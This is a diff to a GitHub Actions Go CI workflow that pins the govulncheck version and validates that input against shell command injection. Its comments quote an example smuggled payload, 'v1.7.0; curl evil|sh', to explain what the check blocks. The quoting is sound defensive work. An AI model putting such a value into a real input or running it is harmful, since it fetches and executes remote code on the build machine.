@@ -61,6 +61,16 @@ on:
         description: 'GolangCI-Lint version'
         type: string
         default: 'v1.62.2'
+      govulncheck_version:
+        description: >-
+          govulncheck version to install, as a Go module query. Pinned rather than `@latest` so that
+          an upstream release cannot change what this workflow runs without anyone here choosing it:
+          golang.org/x/vuln v1.8.0 raised its own `go` directive to 1.26.0 and broke every Go
+          repository on this channel the day it landed, because the install step has no
+          `continue-on-error` to soften it. The install itself runs under GOTOOLCHAIN=auto, so this
+          default works at any go_version — it does NOT have to track it.
+        type: string
+        default: 'v1.7.0'
       golangci_lint_args:
         description: 'Additional arguments for golangci-lint'
         type: string
@@ -345,7 +355,33 @@ jobs:
         continue-on-error: true
 
       - name: Install govulncheck
-        run: go install golang.org/x/vuln/cmd/govulncheck@latest
+        env:
+          # actions/setup-go exports GOTOOLCHAIN=local for the whole job, so `go install` of a tool
+          # whose own `go` directive is newer than go_version REFUSES instead of upgrading. That is
+          # right for the scan (it must analyse under the pinned toolchain) and wrong for BUILDING
+          # the scanner, so the override is scoped to this step alone.
+          GOTOOLCHAIN: auto
+          # Never interpolated into the script body: `${{ }}` is substituted BEFORE the shell sees
+          # the line, so a caller passing `v1.7.0; curl evil|sh` would be running commands, not
+          # naming a version. As an env var it is data the shell expands, and the check below bounds
+          # it to a module query even if a caller forwards something untrusted into this input.
+          GOVULNCHECK_VERSION: ${{ inputs.govulncheck_version }}
+        run: |
+          # CHARSET FIRST, SHAPE SECOND, and in that order for a reason. A shape glob alone accepts
+          # "v1.7.0; curl evil | sh" — its trailing * swallows the payload — and `grep -E` matches
+          # LINE BY LINE, so a value whose first line is "v1.7.0" passes whatever follows the
+          # newline. `case` tests the whole string at once, so rejecting every character outside
+          # the module-query set closes both holes before the shape is considered.
+          case "$GOVULNCHECK_VERSION" in
+            *[!0-9A-Za-z.+_-]*)           bad=1 ;;
+            latest|v[0-9]*.[0-9]*.[0-9]*) bad=  ;;
+            *)                            bad=1 ;;
+          esac
+          if [ -n "$bad" ]; then
+            echo "::error::govulncheck_version must be 'latest' or a vX.Y.Z module query, got '$GOVULNCHECK_VERSION'"
+            exit 1
+          fi
+          go install "golang.org/x/vuln/cmd/govulncheck@$GOVULNCHECK_VERSION"
 
       - name: Run govulncheck
         working-directory: ${{ matrix.app.working_dir }}
